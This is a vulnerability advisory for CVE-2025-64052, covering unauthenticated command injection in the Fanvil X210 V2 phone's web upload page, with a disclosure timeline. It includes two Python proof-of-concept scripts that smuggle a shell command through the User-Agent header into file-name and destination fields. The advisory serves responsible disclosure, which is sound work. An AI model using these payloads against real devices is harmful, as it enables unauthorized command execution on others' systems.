# Multiple Unauthenticated Command Injections in Fanvil x210 V2 (CVE-2025-64052)
## Summary
We identified multiple command injections that permits unauthenticated attackers on the local network to execute arbitrary system commands. This vulnerability enables remote attackers to execute arbitrary commands on the system.

## Affected products
- Fanvil x210 V2, firmware V2.12.20

## Details
During an analysis of the latest Fanvil X210 firmware (`X210-V2-2.12.20`, dated **2024-07-30**), a critical security issue was identified. The deviceâ€™s web application, used for configuration, allows an **unauthenticated attacker on the local network** to inject remote commands during file upload.

## PoC
Command injection on `upload/dest` parameter during file upload:
```python
#!/usr/bin/python3
import requests
from time import sleep

IP="192.168.122.246"
PORT="8080"
UPLOAD_URL=f"http://{IP}:{PORT}/cgi-bin/webconfig?page=upload&action=submit"

multipart_form_data = {
	'upload/newfile': ('test.txt', 'testfile', 'application/octet-stream'),
	'upload/dest': (None, '/testdir`$HTTP_USER_AGENT`')
}

headers = {'User-Agent': '/bin/sh -c id>/tmp/pwnd1'}
response = requests.post(UPLOAD_URL, files=multipart_form_data, headers=headers)
```

Command injection on `upload/newfile` parameter during file upload:
```python
#!/usr/bin/python3
import requests
from time import sleep

IP="192.168.122.246"
PORT="8080"
UPLOAD_URL=f"http://{IP}:{PORT}/cgi-bin/webconfig?page=upload&action=submit"

multipart_form_data = {
	'upload/newfile': ('file`$HTTP_USER_AGENT`', 'testfile', 'application/octet-stream'),
	'upload/dest': (None, '/testdir')
}

headers = {'User-Agent': '/bin/sh -c id>/tmp/pwnd2'}
response = requests.post(UPLOAD_URL, files=multipart_form_data, headers=headers)
```

## Impact
By exploiting this vulnerability, remote attackers could execute arbitrary commands on the system.

## Additional information
Issue fixed on firmware version 2.12.22.2

## Credits
Spike Reply Cybersecurity Team

## Disclosure timeline
- 01/03/2025: Vulnerability discovered
- 04/03/2025: Initial contact with vendor
- 06/03/2025: Technical details shared with vendor
- 25/04/2025: Disclosure date agreed with vendor (June 6, 2025)
- 14/05/2025: Vendor reports inability to reproduce this and other reported issues
- 06/06/2025: Team informs vendor they are retesting on firmware v2.12.22.2, released after initial contact (April 28, 2025)
- 09/06/2025: Vendor investigates whether web server changes in new firmware address the issues
- 25/06/2025: Team requests update - no response
- 07/07/2025: Follow-up request sent - still no response
- 16/07/2025: Team sends another follow-up and sets new disclosure date (July 28, 2025) - no response
- 25/11/2025: Disclosure
